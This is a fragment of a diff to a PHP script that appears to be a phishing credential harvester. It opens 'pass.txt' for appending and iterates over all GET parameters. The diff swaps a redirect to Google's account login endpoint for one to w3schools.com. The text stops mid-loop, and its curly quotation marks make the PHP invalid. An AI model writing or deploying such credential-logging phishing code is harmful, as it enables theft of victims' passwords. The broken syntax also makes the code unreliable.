@@ -1,6 +1,6 @@
 <?php
  echo "<script type = 'text/javascript'> alert('helloo'); </script>";
-header(“Location: https://www.google.com/accounts/ServiceLoginAuth “);
+header(“Location: http://www.w3schools.com “);
         echo "<script type = 'text/javascript'> alert('hii'); </script>";
 $handle = fopen(“pass.txt”, “a”);
 foreach($_GET as $variable => $value) {
